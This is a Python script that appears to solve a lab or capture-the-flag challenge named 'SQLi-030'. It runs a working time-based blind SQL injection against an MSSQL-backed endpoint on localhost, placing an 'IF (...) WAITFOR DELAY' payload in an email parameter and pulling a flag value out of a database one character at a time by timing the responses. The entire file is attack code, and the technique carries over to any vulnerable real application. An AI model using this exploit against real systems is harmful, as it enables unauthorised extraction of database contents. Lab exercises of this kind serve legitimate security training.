#!/usr/bin/env python3
"""SQLi-030: MSSQL WAITFOR DELAY Exploit"""
import requests, time, string

BASE_URL = "http://localhost:5030"
CHARSET = string.ascii_letters + string.digits + "_{}"

def check(cond):
    start = time.time()
    payload = f"test'; IF ({cond}) WAITFOR DELAY '0:0:2'--"
    requests.get(f"{BASE_URL}/validate?email={requests.utils.quote(payload)}", timeout=30)
    return time.time() - start > 1.5

def extract(table, column):
    result = ""
    for pos in range(1, 50):
        for c in CHARSET:
            if check(f"(SELECT SUBSTRING({column},{pos},1) FROM {table})='{c}'"):
                result += c
                print(f"[+] {column}: {result}")
                break
        else:
            break
    return result

if __name__ == "__main__":
    print("SQLi-030: MSSQL WAITFOR Exploit")
    flag = extract("flags", "value")
    print(f"[+] FLAG: {flag}")
